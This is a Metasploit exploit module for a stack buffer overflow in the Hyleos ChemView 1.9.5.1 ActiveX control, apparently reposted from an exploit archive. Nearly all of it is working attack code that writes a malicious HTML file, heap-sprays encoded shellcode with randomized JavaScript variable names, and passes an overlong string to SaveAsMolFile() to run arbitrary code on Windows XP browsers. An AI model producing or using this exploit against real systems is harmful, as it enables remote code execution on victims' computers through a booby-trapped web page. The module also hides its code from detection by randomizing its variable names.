Hyleos ChemView v1.9.5.1 ActiveX Control Buffer Overflow Exploit (meta)
=======================================================================

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Hyleos ChemView ActiveX Control Buffer Overflow Exploit&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack-based buffer overflow within HyleosChemView.ocx of Hyleos ChemView 1.9.5.1
                By setting an overly long value to &#039;SaveAsMolFile()&#039;, an attacker can overrun a buffer
                and execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Dz_attacker <dz_attacker[at]hotmail.fr>&#039;
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.security-assessment.com/files/advisories/2010-02-11_ChemviewX_Activex.pdf&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;         => 1024,
                    &#039;BadChars&#039;      => "\x00\x0a\x0a\x20",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0&#039;, { &#039;Ret&#039; => 0x0A0A0a0A, &#039;Offset&#039; => 150 } ]
                ],
            &#039;DisclosureDate&#039; => &#039;Feb 11 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,  &#039;msf.html&#039;]),
                ], self.class)
    end
 
    def exploit
 
        # Encode the shellcode
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
 
        # Setup exploit buffers
        nops      = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))
        ret       = Rex::Text.uri_encode([target.ret].pack(&#039;L&#039;))
        blocksize = 0x40000
        fillto    = 300
        offset    = target[&#039;Offset&#039;]
 
        # Randomize the javascript variable names
        chemview     = rand_text_alpha(rand(100) + 1)
        j_shellcode  = rand_text_alpha(rand(100) + 1)
        j_nops       = rand_text_alpha(rand(100) + 1)
        j_ret        = rand_text_alpha(rand(100) + 1)
        j_headersize = rand_text_alpha(rand(100) + 1)
        j_slackspace = rand_text_alpha(rand(100) + 1)
        j_fillblock  = rand_text_alpha(rand(100) + 1)
        j_block      = rand_text_alpha(rand(100) + 1)
        j_memory     = rand_text_alpha(rand(100) + 1)
        j_counter    = rand_text_alpha(rand(30) + 2)
 
 
        html = %Q|<html>
<object classid=&#039;clsid:C372350A-1D5A-44DC-A759-767FC553D96C&#039; id=&#039;#{chemview}&#039;></object>
<script>
#{j_shellcode}=unescape(&#039;#{shellcode}&#039;);
#{j_nops}=unescape(&#039;#{nops}&#039;);
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};
 
var #{j_ret}=&#039;&#039;;
for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape(&#039;#{ret}&#039;);
#{chemview}.SaveAsMolFile(#{j_ret});
</script>
</html>|
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(html)
    end
 
end



